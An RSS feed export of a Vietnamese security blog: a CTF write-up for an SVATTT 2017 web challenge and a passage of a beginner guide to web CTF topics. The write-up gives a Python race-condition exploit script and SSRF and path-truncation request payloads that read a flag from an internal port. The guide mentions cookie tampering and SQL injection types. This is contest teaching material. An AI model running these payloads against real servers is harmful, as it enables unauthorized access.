<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>@sting8k</title><description>@sting8k</description><link>http://localhost:2368/</link><generator>Ghost 0.7</generator><lastBuildDate>Tue, 21 Nov 2017 16:08:08 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>[SVATTT 2017] Writeup Web daemon: The Last Bullet</title><description>&lt;p&gt;Challenge:  &lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href="http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/"&gt;http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Má»™t chÃºt thÃ­nh lÃºc vÃ o game: robots.txt&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;User-agent: *  
Disallow: /backkup-1337/  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Gáº¯p Ä‘Æ°á»£c ra 3 cÃ¡i params &lt;code&gt;insert&lt;/code&gt;, &lt;code&gt;access_key&lt;/code&gt; vÃ  &lt;code&gt;path&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Náº¿u &lt;strong&gt;khÃ´ng&lt;/strong&gt; set param &lt;code&gt;insert&lt;/code&gt; =&gt; Select vÃ  hiá»‡n káº¿t quáº£ theo &lt;code&gt;access_key&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class="language-php"&gt;...
$access_key=mysql_real_escape_string($_GET['access_&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/svattt-2017-writeup-web-daemon-the-last-bullet/</link><guid isPermaLink="false">7191f76f-5686-4383-8531-6c9a319a83fa</guid><dc:creator>Do Anh</dc:creator><pubDate>Tue, 21 Nov 2017 14:02:00 GMT</pubDate><media:content url="http://localhost:2368/content/images/2017/11/wallhaven-494982-1.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2017/11/wallhaven-494982-1.png" alt="[SVATTT 2017] Writeup Web daemon: The Last Bullet"&gt;&lt;p&gt;Challenge:  &lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href="http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/"&gt;http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Má»™t chÃºt thÃ­nh lÃºc vÃ o game: robots.txt&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;User-agent: *  
Disallow: /backkup-1337/  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Gáº¯p Ä‘Æ°á»£c ra 3 cÃ¡i params &lt;code&gt;insert&lt;/code&gt;, &lt;code&gt;access_key&lt;/code&gt; vÃ  &lt;code&gt;path&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Náº¿u &lt;strong&gt;khÃ´ng&lt;/strong&gt; set param &lt;code&gt;insert&lt;/code&gt; =&gt; Select vÃ  hiá»‡n káº¿t quáº£ theo &lt;code&gt;access_key&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class="language-php"&gt;...
$access_key=mysql_real_escape_string($_GET['access_key']);

$sql = "SELECT url from local_bookmark where access_key='".$access_key."' order by id desc limit 1";
...
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;Náº¿u set param &lt;code&gt;insert&lt;/code&gt; =&gt; Insert vÃ o db dá»¯ liá»‡u láº¥y tá»« &lt;code&gt;access_key&lt;/code&gt; vÃ  &lt;code&gt;path&lt;/code&gt;, ngay sau Ä‘Ã³ thÃ¬ ... delete ?? ğŸ˜€ ??&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class="language-php"&gt;$url = "http://tradahacking.vn".$path."/phiasaumotcogai.html"; 

$url = mysql_real_escape_string($url);

if(preg_match('/(#|\?|&amp;amp;)/i', $url))  
    {
        exit('Bad words!');
    }
$sql = "INSERT INTO local_bookmark (url, access_key) VALUES ('" .$url. "', '".$access_key."');";
...
include_once("delete.php");  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Okay, select thÃ¬ mÃ©o cÃ³ gÃ¬ Ä‘á»ƒ select rá»“i, insert thÃ¬ bá»‹ delete ngay :v&lt;/p&gt;

&lt;p&gt;NhÆ°ng ... &lt;br&gt;
Ngay tá»« Ä‘áº§u khi Ä‘á»c source, mÃ¬nh nháº­n tháº¥y khÃ¡ báº¥t thÆ°á»ng khi tÃ¡c giáº£ luÃ´n Ä‘áº·t hÃ m connect, close db á»Ÿ tá»«ng file, cá»™ng thÃªm viá»‡c vá»«a insert vá»«a delete nhÃ¬n vá»™i vler ğŸ˜‚ . &lt;/p&gt;

&lt;p&gt;&lt;img src="http://localhost:2368/content/images/2017/11/Screen-Shot-2017-11-21-at-9-36-03-PM.png" alt="[SVATTT 2017] Writeup Web daemon: The Last Bullet"&gt;&lt;/p&gt;

&lt;p&gt;Ya, nÃ³ cÃ³ mÃ¹i &lt;strong&gt;Race condition&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Code khai thÃ¡c:  &lt;/p&gt;

&lt;pre&gt;&lt;code class="language-python"&gt;import thread  
import time  
import requests  
import random

def exploit(access_key):  
    resp = requests.get("http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/index.php?path=xxx&amp;amp;insert=1&amp;amp;access_key=xxxxx"
                    +str(access_key))

try:  
    ak = random.randint(1000000,9999999)
    thread.start_new_thread( exploit, (ak,) )
    thread.start_new_thread( exploit, (ak,) )
    resp = requests.get("http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/index.php?access_key=xxxxx"+str(ak))
    print "http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/index.php?access_key=xxxxx"+str(ak)
    print resp.text
except:  
    print "Error: unable to start thread"
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src="http://localhost:2368/content/images/2017/11/Screen-Shot-2017-11-21-at-10-02-49-PM.png" alt="[SVATTT 2017] Writeup Web daemon: The Last Bullet"&gt;&lt;/p&gt;

&lt;p&gt;Insert Ä‘Æ°á»£c rá»“i, giá» sao?&lt;/p&gt;

&lt;p&gt;Äá»ƒ Ã½ má»™t chÃºt:&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-php"&gt;$url = "http://tradahacking.vn".$path."/phiasaumotcogai.html"; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ÄÃ¢y lÃ  cÃ¡i sáº½ Ä‘Æ°á»£c cho vÃ o DB, vÃ  rá»“i "bá»‹" select ra, Ä‘áº©y qua hÃ m &lt;code&gt;file_get_contents&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-php"&gt;$sql = "SELECT url from local_bookmark where access_key='".$access_key."' order by id desc limit 1";
$result = $conn-&amp;gt;query($sql);

if ($result-&amp;gt;num_rows &amp;gt; 0) {  
    // output data of each row
    while($row = $result-&amp;gt;fetch_assoc()) {
        $bookmark = $row["url"];
        //echo "Your Temporary bookmark is: " . $bookmark."&amp;lt;br&amp;gt;";//For harder version, my Ninjas ;)
    echo "Ok, Ok !!! You win ;)";
    }
}
echo file_get_contents($bookmark);  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tá»›i lÃºc dÃ¹ng tá»›i hint cá»§a @g4mm4:  &lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Local System:1337&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;MÃ¬nh cÃ³ thá»ƒ biáº¿n cÃ¡i &lt;code&gt;$url&lt;/code&gt; trÃªn kia thÃ nh dáº¡ng nhÆ° nÃ y:  &lt;/p&gt;

&lt;pre&gt;&lt;code&gt;http://tradahacking.vn:xyz@localhost:1337/phiasaumotcogai.html  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thay vÃ¬ tradahacking.vn lÃ  domain thÃ¬ nÃ³ sáº½ bá»‹ chuyá»ƒn thÃ nh username ğŸ˜Œ&lt;/p&gt;

&lt;p&gt;NhÆ°ng giá» láº¡i káº¹t tiáº¿p phÃ¡t ná»¯a, cÃ¡i cáº§n bÃ¢y lÃ  directory listing cá»§a &lt;a href="http://localhost:1337"&gt;http://localhost:1337&lt;/a&gt; chá»© khÃ´ng pháº£i &lt;a href="http://localhost:1337/phiasaumotcogai.html"&gt;http://localhost:1337/phiasaumotcogai.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;May thay trong lÃºc chÆ°a ra cÃ¡i hint &lt;code&gt;local system:1337&lt;/code&gt; (mÃ  thá»±c ra cÃ¡i hint nÃ y nÃ³ cÃ³ sáºµn tá»« Ä‘áº§u trÃªn title &lt;a href="http://119.81.181.252/8d0943ff26c8d0cfe74924b9f8b87298/"&gt;Web&lt;/a&gt; rá»“i &lt;br&gt;
 mÃ  mÃ¬nh k Ä‘á»ƒ Ã½ ğŸ˜©), mÃ¬nh Ä‘Ã£ Ä‘áº©y request trÃªn kia vá» server riÃªng vÃ  fuzz linh tinh :v&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;119.81.181.252 - - [xx/Nov/2017 xx:xx:28] "GET /./././../../././././././././././././././/../././/phiasa HTTP/1.0" 404 -  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ã€ hÃ¡, path truncation. Do giá»›i háº¡n sá»‘ kÃ½ tá»± cá»§a field url trong db.&lt;/p&gt;

&lt;p&gt;Nhiá»‡m vá»¥ bÃ¢y giá» chá»‰ lÃ  Ä‘áº©y request vá» server riÃªng, truncate cho vá»«a Ä‘á»§ háº¿t cÃ¡i file html kia, xong thay láº¡i localhost:1337 vÃ o (cho Ä‘á»¡ nháº§m láº«n ğŸ˜¥)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;index.php?path=:xyz@localhost:1337/.//./././../../././././././././././././././/.././././././&amp;amp;insert=1&amp;amp;access_key=xxxxx  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src="http://localhost:2368/content/images/2017/11/Screen-Shot-2017-11-21-at-10-39-36-PM.png" alt="[SVATTT 2017] Writeup Web daemon: The Last Bullet"&gt;&lt;/p&gt;

&lt;p&gt;Get flag.php  &lt;/p&gt;

&lt;pre&gt;&lt;code&gt;index.php?path=:wtf@localhost:1337/./././././././././././././././././././././././././flag.php&amp;amp;insert=1&amp;amp;access_key=xxxxx  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src="http://localhost:2368/content/images/2017/11/Screen-Shot-2017-11-21-at-10-41-55-PM.png" alt="[SVATTT 2017] Writeup Web daemon: The Last Bullet"&gt;&lt;/p&gt;</content:encoded></item><item><title>[CTF] LÃ m tháº¿ nÃ o Ä‘á»ƒ báº¯t Ä‘áº§u vá»›i CTF máº£ng Web</title><description>&lt;p&gt;Web lÃ  má»™t trong nhá»¯ng máº£ng dá»… tiáº¿p cáº­n khi chÆ¡i CTF. &lt;strong&gt;Váº­y báº¯t Ä‘áº§u CTF máº£ng Web nhÆ° tháº¿ nÃ o?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Giá» Ä‘áº·t má»™t website trÆ°á»›c máº·t mÃ¬nh thÃ¬ khÃ´ng thá»ƒ cá»© tháº¿ mÃ  lÃ m. LÃ m gÃ¬? TÃ¬m flag - má»™t chuá»—i bÃ­ máº­t do ngÆ°á»i ra Ä‘á» giáº¥u á»Ÿ&lt;/p&gt;</description><link>http://localhost:2368/ctf-lam-the-nao-de-bat-dau-voi-ctf-mang-web/</link><guid isPermaLink="false">0deb8673-9a96-475a-9870-e210c2a3d7e1</guid><category>web</category><category>CTF</category><category>learn</category><category>beginner</category><category>sql</category><category>xss</category><category>lfi</category><category>rfi</category><dc:creator>Do Anh</dc:creator><pubDate>Mon, 07 Mar 2016 03:11:04 GMT</pubDate><media:content url="http://localhost:2368/content/images/2016/03/1024px-DEF_CON_17_CTF_competition.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2016/03/1024px-DEF_CON_17_CTF_competition.jpg" alt="[CTF] LÃ m tháº¿ nÃ o Ä‘á»ƒ báº¯t Ä‘áº§u vá»›i CTF máº£ng Web"&gt;&lt;p&gt;Web lÃ  má»™t trong nhá»¯ng máº£ng dá»… tiáº¿p cáº­n khi chÆ¡i CTF. &lt;strong&gt;Váº­y báº¯t Ä‘áº§u CTF máº£ng Web nhÆ° tháº¿ nÃ o?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Giá» Ä‘áº·t má»™t website trÆ°á»›c máº·t mÃ¬nh thÃ¬ khÃ´ng thá»ƒ cá»© tháº¿ mÃ  lÃ m. LÃ m gÃ¬? TÃ¬m flag - má»™t chuá»—i bÃ­ máº­t do ngÆ°á»i ra Ä‘á» giáº¥u á»Ÿ Ä‘Ã¢u Ä‘Ã³ quanh cÃ¡i web. Muá»‘n tÃ¬m Ä‘Æ°á»£c nÃ³ trÆ°á»›c háº¿t pháº£i xem Ä‘á» bÃ i gá»£i Ã½ cÃ¡i gÃ¬, cho cÃ¡i gÃ¬, trong web cÃ³ gÃ¬, lÃ m sao Ä‘á»ƒ khai thÃ¡c máº¥y cÃ¡i Ä‘Ã³. Tá»« Ä‘Ã¢y láº¡i cÃ³ má»™t váº¥n Ä‘á»: &lt;strong&gt;Pháº£i hiá»ƒu vá» web trÆ°á»›c Ä‘Ã£&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;NÃ³i thÃªm má»™t chÃºt lÃ  á»Ÿ bÃ i viáº¿t nÃ y mÃ¬nh sáº½ khÃ´ng Ä‘i sÃ¢u vÃ o chi tiÃªt, mÃ¬nh chá»‰ dá»«ng láº¡i á»Ÿ viá»‡c Ä‘áº·t ra cÃ¡c váº¥n Ä‘á» quan trá»ng mÃ  cÃ¡c báº¡n cáº§n tÃ¬m hiá»ƒu&lt;/em&gt;&lt;/p&gt;

&lt;hr&gt;

&lt;h4 id="webhotngthno"&gt;Web hoáº¡t Ä‘á»™ng tháº¿ nÃ o?&lt;/h4&gt;

&lt;p&gt;ChÃºng ta sáº½ cáº§n náº¯m kiáº¿n thá»©c vá» web qua nhá»¯ng váº¥n Ä‘á» nhÆ° tháº¿ nÃ y:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;CÃ¡ch hoáº¡t Ä‘á»™ng cá»§a web tá»« phÃ­a client cho Ä‘áº¿n phÃ­a server sáº½ cÃ³ nhá»¯ng gÃ¬? &lt;/li&gt;
&lt;li&gt;Client gá»­i request cho server vÃ  nháº­n láº¡i response nhÆ° tháº¿ nÃ o? Qua Ä‘Ã¢u? (HTTP, HTTP Header, HTTP Methods)&lt;/li&gt;
&lt;li&gt;CÃ¡ch client vÃ  server lÆ°u trá»¯ thÃ´ng tin cá»§a nhau (qua cÆ¡ sá»Ÿ dá»¯ liá»‡u, cookie, session, â€¦).&lt;/li&gt;
&lt;li&gt;CÃ¡c ngÃ´n ngá»¯ cáº¥u thÃ nh 1 trang web hoáº·c thÆ°á»ng Ä‘Æ°á»£c dÃ¹ng khi xÃ¢y dá»±ng web. (HTML, CSS, JS, PHP, SQL ...)&lt;/li&gt;
&lt;li&gt;ThÃ´ng tin whois cá»§a 1 trang web (ip, owner,...).&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id="1linquannhttp"&gt;1. LiÃªn quan Ä‘áº¿n HTTP&lt;/h4&gt;

&lt;p&gt;Má»—i khi truy cáº­p má»™t website, tá»« phÃ­a client pháº£i gá»­i &lt;strong&gt;request&lt;/strong&gt; lÃªn server qua &lt;strong&gt;giao thá»©c HTTP&lt;/strong&gt;, vÃ  nhá»¯ng request nÃ y Ä‘Æ°á»£c thá»ƒ hiá»‡n dÆ°á»›i dáº¡ng &lt;strong&gt;HTTP header&lt;/strong&gt;. Giá»‘ng nhÆ° viá»‡c muá»‘n gá»­i bá»©c thÆ° thÃ¬ pháº£i cÃ³ Ä‘á»‹a chá»‰ nháº­n, tÃªn ngÆ°á»i viáº¿t, thÃ´ng tin vá» ngÆ°á»i viáº¿t, ná»™i dung dung thÆ° thÃ¬ cÃ³ yÃªu cáº§u,... CÃ¡c headers cÅ©ng chá»©a nhá»¯ng thÃ´ng tin tÆ°Æ¡ng tá»± nhÆ° váº­y.&lt;/p&gt;

&lt;p&gt;Nhá»¯ng headers nÃ y cÃ³ ráº¥t nhiá»u nÃªn cÃ¡c báº¡n cÃ³ thá»ƒ tá»± google tÃ¬m hiá»ƒu. &lt;em&gt;Äáº·c biá»‡t lÃ  chÃº Ã½ vá» &lt;strong&gt;cookie, user-agent&lt;/strong&gt;, lÃ  2 trÆ°á»ng hay Ä‘Æ°á»£c dÃ¹ng trong cÃ¡c bÃ i ctf.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Gá»§i má»™t HTTP request Ä‘i cÅ©ng cÃ³ thá»ƒ gá»­i Ä‘Æ°á»£c báº±ng nhiá»u dáº¡ng khÃ¡c nhau. CÃ¡c dáº¡ng nÃ y chÃ­nh lÃ  cÃ¡c &lt;strong&gt;HTTP Methods&lt;/strong&gt; hay cÃ²n gá»i lÃ  HTTP Verb. Dáº¡ng cá»§a nÃ³ bao gá»“m GET, POST, PUT, DELETE, OPTIONS,... ThÆ°á»ng dÃ¹ng nháº¥t lÃ  &lt;strong&gt;POST vÃ  GET&lt;/strong&gt;. CÃ¡c báº¡n nÃªn tÃ¬m hiá»ƒu ká»¹ Ä‘iá»ƒm giá»‘ng vÃ  khÃ¡c cá»§a 2 methods nÃ y. &lt;/p&gt;

&lt;p&gt;Má»™t sá»‘ bÃ i khi dÃ¹ng POST, GET Ä‘á»u khÃ´ng nháº­n Ä‘Æ°á»£c gÃ¬ tá»« phÃ­a server, nhÆ°ng khi Ä‘á»•i sang HEAD, PUT, hoáº·c method khÃ¡c thÃ¬ láº¡i ra káº¿t quáº£. LÃ½ do lÃ  á»Ÿ file .htaccess Ä‘Ã£ block 2 method Ä‘Ã³. Tham kháº£o:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.tutorialspoint.com/restful/restful_introduction.htm"&gt;http://www.tutorialspoint.com/restful/restful_introduction.htm&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.htmlgoodies.com/beyond/webmaster/article.php/3899416/What-is-the-htaccess-File-and-What-Can-I-Do-With-It.htm"&gt;.htaccess lÃ  gÃ¬?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/11584101/restrict-post-request-the-server"&gt;.htaccess Restrict method POST GET&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;NÃ³i tiáº¿p Ä‘áº¿n &lt;strong&gt;response&lt;/strong&gt;. Háº³n cÃ¡c báº¡n Ä‘Ã£ khÃ´ng Ã­t láº§n gáº·p nhá»¯ng thÃ´ng bÃ¡o kiá»ƒu &lt;code&gt;404 Not Found&lt;/code&gt; hoáº·c &lt;code&gt;302 Forbidden&lt;/code&gt; khi truy cáº­p má»™t url nÃ o Ä‘Ã³. ÄÃ³ lÃ  vÃ¬ sau má»™t request Ä‘Æ°á»£c gá»­i Ä‘áº¿n server, ta sáº½ nháº­n Ä‘Æ°á»£c response. Trong response, má»™t cÃ¡i luÃ´n luÃ´n cÃ³ lÃ  &lt;strong&gt;HTTP Status Code. Má»—i Ä‘áº§u sá»‘ 1xx 2xx 3xx 4xx 5xx cÃ³ má»™t Ã½ nghÄ©a khÃ¡c nhau.&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Tham kháº£o: &lt;a href="http://aptech.vn/kien-thuc-tin-hoc/tim-hieu-co-ban-ve-http-va-dinh-dang-cua-cac-http-message.html"&gt;TÃ¬m hiá»ƒu cÆ¡ báº£n vá» HTTP vÃ  Ä‘á»‹nh dáº¡ng cá»§a cÃ¡c HTTP message&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src="http://localhost:2368/content/images/2016/03/Screen-Shot-2016-03-07-at-12-10-19-PM.png" alt="[CTF] LÃ m tháº¿ nÃ o Ä‘á»ƒ báº¯t Ä‘áº§u vá»›i CTF máº£ng Web"&gt;&lt;/p&gt;

&lt;p&gt;Cuá»‘i cÃ¹ng lÃ  viá»‡c &lt;strong&gt;thao tÃ¡c vá»›i cÃ¡c headers&lt;/strong&gt;. TrÃªn Firefox mÃ¬nh hay dÃ¹ng addon &lt;a href="https://addons.mozilla.org/en-US/firefox/addon/live-http-headers-fixed-by-dan"&gt;Live Http Headers&lt;/a&gt; hoáº·c &lt;a href="https://addons.mozilla.org/en-US/firefox/addon/tamper-data/"&gt;Tamper data&lt;/a&gt;. NÃ¢ng cao hÆ¡n cÃ¡c báº¡n hÃ£y táº­p dÃ¹ng &lt;a href="https://curl.haxx.se/"&gt;curl&lt;/a&gt;, ráº¥t tiá»‡n vÃ  cÃ³ api cho nhiá»u ngÃ´n ngá»¯ láº­p trÃ¬nh.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Tham kháº£o: &lt;a href="http://curl.haxx.se/docs/httpscripting.html"&gt;http://curl.haxx.se/docs/httpscripting.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id="2linquannccngnnglptrnhweb"&gt;2. LiÃªn quan Ä‘áº¿n cÃ¡c ngÃ´n ngá»¯ láº­p trÃ¬nh web&lt;/h4&gt;

&lt;p&gt;Vá»›i nhiá»u bÃ i CTF chÃºng ta sáº½ pháº£i Ä‘á»c hiá»ƒu code, phÃ¢n tÃ­ch hoáº·c Ä‘oÃ¡n code. NÃ³i chung ta cáº§n trang bá»‹ kiáº¿n thá»©c vá» láº­p trÃ¬nh, hiá»ƒu tá»«ng ngÃ´n ngá»¯ Ä‘á»ƒ lÃ m gÃ¬. VÃ­ dá»¥ nhÆ° html, css thÃ¬ giá»›i háº¡n cÅ©ng Ä‘á»ƒ thá»ƒ hiá»‡n giao diá»‡n web, á»Ÿ html5 "xá»‹n" hÆ¡n thÃ¬ lÃ m Ä‘Æ°á»£c game gÃ¬ Ä‘Ã³; js thÃ¬ lÃ m Ä‘Æ°á»£c nhiá»u hÆ¡n, hiá»‡u á»©ng, tÃ­nh toÃ¡n â€¦, quan trá»ng máº¥y tháº±ng nÃ y Ä‘á»u lÃ  kiá»ƒu ngÃ´n ngá»¯ á»Ÿ phÃ­a client, tá»©c lÃ  cháº¡y Ä‘Æ°á»£c luÃ´n á»Ÿ phÃ­a mÃ¡y mÃ¬nh, vÃ  mÃ¬nh xem Ä‘Æ°á»£c code gá»‘c cá»§a nÃ³.&lt;/p&gt;

&lt;p&gt;Äá»‘i vá»›i PHP, ASP, JSP,... Ä‘Ã¢y lÃ  cÃ¡c ngÃ´n ngá»¯ Ä‘Æ°á»£c biÃªn dá»‹ch trÃªn server, vÃ  code gá»‘c thÃ¬ khÃ´ng xem Ä‘Æ°á»£c nhÆ°ng cÃ³ ráº¥t nhiá»u bÃ i CTF chá»§ Ä‘á»™ng cho ngÆ°á»i chÆ¡i Ä‘á»c code Ä‘á»ƒ phÃ¢n tÃ­ch hoáº·c cÃ³ lá»—i giÃºp ta cÃ³ thá»ƒ Ä‘á»c code tá»« Ä‘Ã³ khai thÃ¡c.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TÃºm láº¡i ta cáº§n há»c HTML, CSS, JS vÃ  má»™t ngÃ´n ngá»¯ server nÃ o Ä‘Ã³ nhÆ° PHP hoáº·c JSP (Ã­t nháº¥t á»Ÿ má»©c Ä‘á»c hiá»ƒu).&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id="3linquanncookiesession"&gt;3. LiÃªn quan Ä‘áº¿n Cookie, Session&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;Náº¯m Ä‘Æ°á»£c Ä‘á»‹nh nghÄ©a cookie, session&lt;/li&gt;
&lt;li&gt;Náº¯m Ä‘Æ°á»£c cÃ¡ch thá»©c lÆ°u trá»¯ cá»§a cookie, session. &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;LÆ°u Ã½ quan trá»ng lÃ  cookie cÃ³ thá»ƒ thay Ä‘á»•i Ä‘Æ°á»£c á»Ÿ phÃ­a client. Session thÃ¬ chá»‰ Ä‘á»•i Ä‘Æ°á»£c id (tá»©c lÃ  lÃ m má»›i id, hoáº·c lÃ m rá»—ng id). PhÃ­a server náº¿u Ä‘á»c cookie ko phÃ¢n biá»‡t ip, Ä‘áº·c Ä‘iá»ƒm trÃ¬nh duyá»‡t ngÆ°á»i dÃ¹ng,... thÃ¬ ta cÃ³ thá»ƒ dá»±a vÃ o Ä‘Ã³ Ä‘á»ƒ khai thÃ¡c. VÃ­ dá»¥ xÃ¡c thá»±c admin qua cookie (cÃ³ má»™t trÆ°á»ng id=1234; user=guest, giá» náº¿u sá»­a thÃ nh id=1;user=admin thÃ¬ sáº½ cÃ³ thá»ƒ Ä‘Äƒng nháº­p dÆ°á»›i quyá»n admin).&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Má»™t vÃ­ dá»¥ ráº¥t cÆ¡ báº£n vá» cookie: &lt;a href="https://www.youtube.com/watch?v=NrC3129Q55c"&gt;https://www.youtube.com/watch?v=NrC3129Q55c&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Giáº£i thÃ­ch má»™t chÃºt vá» clip phÃ­a trÃªn nhÆ° sau.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;PhÃ­a server cÃ³ má»™t Ä‘oáº¡n code kiá»ƒu nhÆ° tháº¿ nÃ y:&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class="language-javascript"&gt;&amp;lt;?php  
if(!isset($_COOKIE[â€˜restricted_loginâ€™])){ //check cÃ³ trÆ°á»ng cookie restricted_login chÆ°a?  
    setcookie(â€˜restricted_loginâ€™,â€™falseâ€™); // náº¿u chÆ°a thÃ¬ set vá»›i giÃ¡ trá»‹ lÃ  False
} else { // Náº¿u Ä‘Ã£ cÃ³ trÆ°á»ng restricted_login
    if($_COOKIE[â€˜restricted_loginâ€™] == â€˜trueâ€™){ //náº¿u giÃ¡ trá»‹ lÃ  true thÃ¬ qua bÃ n
    // Qua bÃ n, + Ä‘iá»ƒm, blah blah ...
    }
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Äoáº¡n code nÃ y sáº½ kiá»ƒm tra xem á»Ÿ phÃ­a client cÃ³ trÆ°á»ng cookie lÃ  &lt;code&gt;restricted_login&lt;/code&gt; chÆ°a, náº¿u chÆ°a cÃ³ thÃ¬ thÃªm vÃ o vÃ  cÃ³ giÃ¡ trá»‹ lÃ  &lt;code&gt;false&lt;/code&gt;. Náº¿u Ä‘Ã£ cÃ³ thÃ¬ kiá»ƒm tra giÃ¡ trá»‹ cá»§a &lt;code&gt;restricted_login&lt;/code&gt;, giÃ¡ trá»‹ báº±ng &lt;code&gt;true&lt;/code&gt; thÃ¬ Ä‘Æ°á»£c phÃ©p qua bÃ n.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Trong CTF Ä‘á»‘i khi cÃ³ má»™t bÃ i SQL injection qua cookie. NÃ³i chung cookie cÅ©ng lÃ  dá»¯ liá»‡u tá»« phÃ­a ngÆ°á»i dÃ¹ng, tá»©c lÃ  mÃ¬nh cÃ³ thá»ƒ thay Ä‘á»•i, vÃ  truyá»n cÃ¡c dá»¯ liá»‡u sai trÃ¡i lÃªn server.&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id="4linquannsqlinjection"&gt;4. LiÃªn quan Ä‘áº¿n SQL Injection&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;SQL injection cÆ¡ báº£n&lt;/li&gt;
&lt;li&gt;SQL injection - Blind: KhÃ´ng thá»ƒ trá»±c tiáº¿p get ra Ä‘oáº¡n dá»¯ liá»‡u mÃ¬nh muá»‘n vÃ  pháº£i get tá»«ng kÃ½ tá»±, hoáº·c dá»±a vÃ  cÃ¡c cÃ¢u lá»‡nh Ä‘iá»u kiá»‡n Ä‘Ãºng sai,... &lt;/li&gt;
&lt;li&gt;SQL injection - Error based: CÃ³ thá»ƒ nÃ³i lÃ  má»Ÿ rá»™ng cá»§a blind, tÃ¹y vÃ o dá»¯ liá»‡u Ä‘Ãºng hoáº·c sai mÃ  server tráº£ vá» káº¿t quáº£ khÃ¡c nhau.&lt;/li&gt;
&lt;li&gt;SQL injection - Time based: DÃ¹ng má»™t cÃ¢u lá»‡nh SQL chá»©a lá»‡nh Sleep(), hoáº·c má»™t hÃ m nÃ o Ä‘Ã³ Ä‘á»ƒ nghá»‰ khi gáº·p Ä‘iá»u kiá»‡n Ä‘Ãºng. VÃ­ dá»¥ IF(Ä‘iá»u kiá»‡n, Ä‘iá»u kiá»‡n náº¿u Ä‘Ãºng-&gt; Sleep(10), Ä‘k náº¿u sai -&gt; null) &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;SQL Injection cÆ¡ báº£n mÃ¬nh há»c qua course nÃ y, cÃ³ thá»ƒ ko cáº§n há»c háº¿t, chá»‰ cáº§n náº¯m rÃµ cÃ¡ch khai thÃ¡c qua SQL sau Ä‘Ã³ cÃ³ thá»ƒ tá»± tÃ¬m hiá»ƒu thÃªm tÃ¹y bÃ i ctf: &lt;/p&gt;

